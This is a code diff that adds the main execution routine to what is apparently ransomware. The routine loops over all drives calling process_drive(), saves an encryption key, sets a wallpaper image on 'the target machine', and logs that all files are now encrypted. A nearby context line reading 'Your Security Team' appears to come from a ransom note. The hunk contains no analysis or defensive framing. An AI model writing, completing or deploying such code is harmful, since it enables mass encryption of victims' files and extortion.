@@ -306,6 +306,28 @@ Your Security Team
         self.create_user_manual(drive)
         self.save_machine_id(drive)
 
+    # Final Execution Function on all drives
+    def execute(self):
+        """Execute the process_drive() on the all Drives,
+         and then save the encryption key locally,
+         after that set wallpaper on the target machine"""
+
+        # Iterate on all drives and then process_drive()
+        for drive in self.drives:
+            logging.info(f"[+] Processing Drive: {drive}")
+            self.process_drive(drive)
+
+        # Save the encryption key locally
+        if self.save_key_locally():
+            logging.info("[+] Encryption Key Locally Saved Successfully.")
+        else:
+            logging.error("[-] Failed to Save the Encryption Key Locally.")
+
+        # create Path of wallpaper & Set wallpaper on the target machine
+        wallpaperPath = resource_path("img/wallpaper.png")
+        self.set_wallpaper(wallpaperPath)
+        logging.info("[+] Wallpaper Set Successfully.")
+        logging.info("[+] Encryption Process Completed. All files now encrypted.")
 
 
 
